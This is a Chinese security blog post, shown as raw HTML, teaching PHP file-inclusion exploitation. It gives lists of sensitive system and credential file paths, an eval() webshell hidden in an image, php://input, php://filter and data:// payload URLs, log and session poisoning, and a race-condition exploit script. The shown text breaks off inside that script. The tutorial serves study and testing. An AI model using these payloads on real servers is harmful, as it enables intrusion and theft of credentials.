@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件包含利用思路 | mrfan6の博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="文件包含利用思路简介​    开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。 ​    为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 文件包含漏洞的环境要求 12345· 变量可控· allow_url_fope">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含利用思路">
+<meta property="og:url" content="https://mrfan6.github.io/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="mrfan6の博客">
+<meta property="og:description" content="文件包含利用思路简介​    开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。 ​    为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 文件包含漏洞的环境要求 12345· 变量可控· allow_url_fope">
+<meta property="og:locale">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106163957646.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170420988.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170454342.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170559313.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170619870.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170713352.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106171312576.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106171724947.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172149125.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172647355.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172620083.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174153217.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174345339.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174548618.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106180353113.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106181135661.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106181206186.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106190919243.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106191140143.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106193045025.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106200857922.png">
+<meta property="og:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106201001030.png">
+<meta property="article:published_time" content="2022-03-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-15T07:44:25.315Z">
+<meta property="article:author" content="mrfan6">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106163957646.png">
+  
+    <link rel="alternative" href="/atom.xml" title="mrfan6の博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img src="../../../../../../../../../img/head.jpg" class="js-avatar show">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/HTML/index.html">火影页面</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="#" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                            
+                                <a class="fl QQ" target="_blank" href="#" title="QQ">QQ</a>
+                            
+                                <a class="fl wechat" target="_blank" href="#" title="wechat">wechat</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 20px;">靶场</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://mrfan6.github.io/">mrfan6</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">爱运动、喜欢接触新鲜事物、迎接新的挑战，更爱游离于错综复杂的编码与逻辑中</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>            
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/HTML/index.html">火影页面</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="#" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://mrfan6.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
+                    
+                        <a class="QQ" target="_blank" href="#" title="QQ">QQ</a>
+                    
+                        <a class="wechat" target="_blank" href="#" title="wechat">wechat</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+      <time datetime="2022-03-31T16:00:00.000Z" itemprop="datePublished">2022-04-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件包含利用思路
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+	<div class="article-entry" itemprop="articleBody">
+	      
+	        
+	            
+	        
+	        
+	        <h1 id="文件包含利用思路"><a href="#文件包含利用思路" class="headerlink" title="文件包含利用思路"></a>文件包含利用思路</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。</p>
+<p>​    为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
+<p><strong>文件包含漏洞的环境要求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">· 变量可控</span><br><span class="line"></span><br><span class="line">· allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据 (远程包含条件)</span><br><span class="line"></span><br><span class="line">· allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件 (本地包含条件)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>绕过有后缀限制的包含</strong></p>
+<p>①使用%00 截断:</p>
+<p>使用条件:</p>
+<p>​    为当前php版本小于5.3.4否则无法使用且还需要关闭魔术引号(magic_quotes_gpc=off)</p>
+<p>②长度截断(利用垃圾字符填充):</p>
+<p>​    Windows  长度最长为256</p>
+<p>​    Linux    长度最长为4096</p>
+<h2 id="一、利用思路："><a href="#一、利用思路：" class="headerlink" title="一、利用思路："></a><strong>一、利用思路：</strong></h2><p>①包含一些敏感的配置文件;</p>
+<p>②配合图片马</p>
+<p>③配合php伪协议</p>
+<p>④配合日志文件</p>
+<p>⑤配合session文件</p>
+<p>⑥利用临时文件</p>
+<h2 id="二、实现方法"><a href="#二、实现方法" class="headerlink" title="二、实现方法"></a>二、实现方法</h2><h3 id="1、包含一些敏感的配置文件"><a href="#1、包含一些敏感的配置文件" class="headerlink" title="1、包含一些敏感的配置文件;"></a>1、包含一些敏感的配置文件;</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Windows系统的一个基本系统配置文件</span><br><span class="line">C:\Windows\win.ini</span><br><span class="line"></span><br><span class="line"># 查看系统版本</span><br><span class="line">c:\boot.ini</span><br><span class="line"></span><br><span class="line"># IIS配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml </span><br><span class="line"></span><br><span class="line"># 存储Windows系统初次安装的密码</span><br><span class="line">c:\windows\repair\sam </span><br><span class="line"></span><br><span class="line"># MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\my.ini </span><br><span class="line"></span><br><span class="line"># MySQL root密码</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD </span><br><span class="line"></span><br><span class="line"># php 配置信息</span><br><span class="line">c:\windows\php.ini </span><br></pre></td></tr></table></figure>
+
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 账户信息</span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line"># 账户密码文件</span><br><span class="line">/etc/shadow</span><br><span class="line"></span><br><span class="line"># Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"># 虚拟网站配置</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line"></span><br><span class="line"># PHP 配置文件</span><br><span class="line">/usr/local/app/php5/lib/php.ini</span><br><span class="line"></span><br><span class="line"># Apache 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"># MySQL 配置文件</span><br><span class="line">/etc/my.conf</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、配合图片马"><a href="#2、配合图片马" class="headerlink" title="2、配合图片马"></a>2、配合图片马</h3><p>​    <strong>文件包含能够配合图片马，是因为文件包含能使得任意文件都以后端脚本形式进行执行，如php的站就会将图片以php的方式执行一遍，这才有了图片马的配合从而getshell</strong></p>
+<p>php 为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#写入一句话并保存为shell.php文件</span><br><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;? @eval($_POST[key]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成图片木马(Windows)命令</p>
+<p>1.jpg为正常图片，shell.php为写入的一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+shell.php shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106163957646.png" alt="image-20211106163957646"></p>
+<p>将其上传至服务器再进行文件包含就能利用到了</p>
+<p>访问文件是存在该图片</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170420988.png" alt="image-20211106170420988"></p>
+<p>此时还是不存在shell.php文件</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170454342.png" alt="image-20211106170454342"></p>
+<p>进行包含 再次验证</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170559313.png" alt="image-20211106170559313"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170619870.png" alt="image-20211106170619870"></p>
+<p>此时可以对比发现shell.php不再出现Not Fund错误了</p>
+<p>进行执行phpinfo() </p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106170713352.png" alt="image-20211106170713352"></p>
+<p>成功执行, 说明命令成功 已经可以getshell了</p>
+<h3 id="3、配合PHP伪协议"><a href="#3、配合PHP伪协议" class="headerlink" title="3、配合PHP伪协议"></a>3、配合PHP伪协议</h3><h4 id="各协议的利用条件和用法"><a href="#各协议的利用条件和用法" class="headerlink" title="各协议的利用条件和用法"></a>各协议的利用条件和用法</h4><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106171312576.png" alt="image-20211106171312576"></p>
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时<strong>post</strong>想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p><strong>注：当enctype=”multipart/form-data”时，php://input是无效的,以及需要开启all_url_include才能使用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.10/include.php?filename=php://input</span><br><span class="line"></span><br><span class="line">POST:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106171724947.png" alt="image-20211106171724947"></p>
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 <strong>任意文件读取</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.10/include.php?filename=php://filter/read=convert.base64-encode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172149125.png" alt="image-20211106172149125"></p>
+<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>数据流封装器，以<strong>GET</strong>传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://192.168.8.10/include.php?filename=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172647355.png" alt="image-20211106172647355"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://192.168.8.10/include.php?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106172620083.png" alt="image-20211106172620083"></p>
+<h3 id="4、配合日志文件"><a href="#4、配合日志文件" class="headerlink" title="4、配合日志文件"></a>4、配合日志文件</h3><p><strong>利用条件：</strong>知道日志文件的存储路径，并且日志文件可读。</p>
+<p>​    利用用户发起请求成功后服务器就会将其请求到的相应信息记录到access.log日志中, 从而配置利用日志文件包含, 不过要注意的是在写入一句话时, url会进行编码, 所以用burp抓包请求后再放出或者利用curl命令也行</p>
+<p>可以通过猜测常见日志文件的路径进行读取, 或者利用phpinfo页面进行确定log位置(查找 server root 关键词)</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174153217.png" alt="image-20211106174153217"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174345339.png" alt="image-20211106174345339"></p>
+<p>进行包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.10/include.php?filename=C:\\phpStudy\\PHPTutorial\\Apache\\logs\\access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106174548618.png" alt="image-20211106174548618"></p>
+<h3 id="5、配合session文件"><a href="#5、配合session文件" class="headerlink" title="5、配合session文件"></a>5、配合session文件</h3><p>常见的php-session存放位置：</p>
+<ol>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+</ol>
+<p>也可以利用phpinfo**(关键词:session.save_path)**读取到session文件所在</p>
+<p>session 的文件名格式为 sess_[phpsessid]。而 phpsessid 在发送的请求的 cookie 字段中可以看到</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106180353113.png" alt="image-20211106180353113"></p>
+<p>要想利用就得要有请求登录, 这里可以借助phpmyadmin平台</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106181135661.png" alt="image-20211106181135661"></p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106181206186.png" alt="image-20211106181206186"></p>
+<h3 id="6、利用临时文件"><a href="#6、利用临时文件" class="headerlink" title="6、利用临时文件"></a>6、利用临时文件</h3><h4 id="①-利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除"><a href="#①-利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除" class="headerlink" title="① 利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除"></a>① 利用能访问的phpinfo页面，对其一次发送大量数据造成临时文件没有及时被删除</h4><p><strong>利用方法简述：</strong></p>
+<p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p><strong>这个时候就需要用到条件竞争，具体流程如下：</strong></p>
+<p>1、发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</p>
+<p>2、因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</p>
+<p>3、php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</p>
+<p>4、所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
+<p>5、此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</p>
+<p>6、利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+<p>存在phpinfo页面</p>
+<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image-20211106190919243.png" alt="image-20211106190919243"></p>
+<p>条件竞争EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python </span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=&quot;Security Test&quot;</span><br><span class="line">    PAYLOAD=&quot;&quot;&quot;%s\r</span><br><span class="line">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot; % TAG</span><br><span class="line">    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="line">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span 